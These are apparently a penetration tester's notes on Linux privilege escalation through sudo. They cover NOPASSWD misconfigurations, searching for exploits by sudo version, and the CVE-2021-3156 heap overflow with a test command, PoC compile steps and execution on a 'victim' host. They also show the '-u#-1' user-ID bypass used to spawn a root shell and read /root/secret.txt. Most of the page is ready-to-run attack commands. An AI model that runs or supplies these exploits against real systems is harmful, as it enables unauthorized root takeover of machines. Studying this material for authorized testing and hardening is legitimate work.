# Sudo

## Sudo Misconfiguration

For this method, the user's password must be known or the user must have the `NOPASSWD` flag set in `/etc/sudoers`, for example:

```text
root ALL=(ALL:ALL) ALL

# Everything runs without a password
user1 ALL=(ALL:ALL) NOPASSWD: ALL

# Specific program does not require a password
user2 ALL=(ALL:ALL) NOPASSWD: /usr/bin/vi
```

Check current sudo privileges and sudo-able programs that do not require passwords:

```shell
sudo -l
```

![sudo -l output](../../../images/linux-sudo/Pasted%20image%2020231102105724.png)

If any allowed programs are found, navigate to GTFOBins and click `SUDO`, or type `+sudo` followed by the program listed in the output above. Then follow the specific instructions for that binary to exploit the misconfiguration.

## Sudo Version Exploit

This method is much less common, but it can still occasionally provide an avenue for escalation. If the sudo version is old enough, known overflow vulnerabilities may exist.

Check the sudo version and look for matching public exploits:

```shell
sudo -V
searchsploit sudo
```

![searchsploit sudo results](../../../images/linux-sudo/Pasted%20image%2020231102105825.png)

![sudo version example](../../../images/linux-sudo/Pasted%20image%2020231102105524.png)

My sudo is not vulnerable in this example, but the technique below applies to a vulnerable version.

Example:

- CVE-2021-3156: Sudo Heap Overflow Vulnerability
- POC: <https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot>

The flaw was introduced in July 2011 and affects all legacy versions from `1.8.2` to `1.8.31p2` and all stable versions from `1.9.0` to `1.9.5p1` in their default configuration.

```shell
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

```shell
# On compromised host
sudo -V
...
Sudo version 1.8.21p2
...

# Verify host is vulnerable to CVE-2021-3156
sudoedit -s '\' `perl -e 'print "A" x 65536'`

# If you receive a usage or error message, sudo is not vulnerable.
# If the result is a segmentation fault, sudo is vulnerable.
```

```shell
# On attacker
git clone https://github.com/r4j0x00/exploits
cd exploits/CVE-2021-3156_one_shot
cat Makefile
```

![Exploit source review](../../../images/linux-sudo/Pasted%20image%2020230528145554.png)

To avoid dependency issues, compile the exploit statically instead of using the provided Makefile directly.

```shell
# Compile exploit and compress for transfer to victim
gcc -static exploit.c -o exploit
mkdir libnss_X
gcc -g -fPIC -shared sice.c -o libnss_X/X.so.2
tar -czvf exploit.tar.gz exploit libnss_X/
```

![Static build steps](../../../images/linux-sudo/Pasted%20image%2020230528145904.png)

Once the exploit is compressed, move the archive to the victim in any way you like, extract it, and execute it to elevate to `root`.

```shell
# On compromised host
tar -xzvf exploit.tar.gz
./exploit
# You are now root
```

## Sudo `-1` User ID Bypass Examples

```text
# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash

With ALL specified, user hacker can run the binary /bin/bash as any user.
```

```text
EXPLOIT:

sudo -u#-1 /bin/bash
```

Sudo does not check for the existence of the specified user ID and executes with an arbitrary user ID using sudo privileges.

`-u#-1` resolves to `0`, which is the user ID for `root`.

If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only `root` has. This can lead directly to a root shell.

```text
(ALL, !root) /bin/ncdu
```

All users except root can run `ncdu`, but with the `-1` bypass, it can be executed as root.

```shell
sudo -u#-1 /bin/ncdu

b
```

![ncdu root bypass](../../../images/linux-sudo/Pasted%20image%2020241023180747.png)

```text
# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/grep

With ALL specified, user hacker can run the binary /bin/grep as any user.
```

```text
EXPLOIT:

sudo -u#-1 /bin/grep '' /root/secret.txt
```
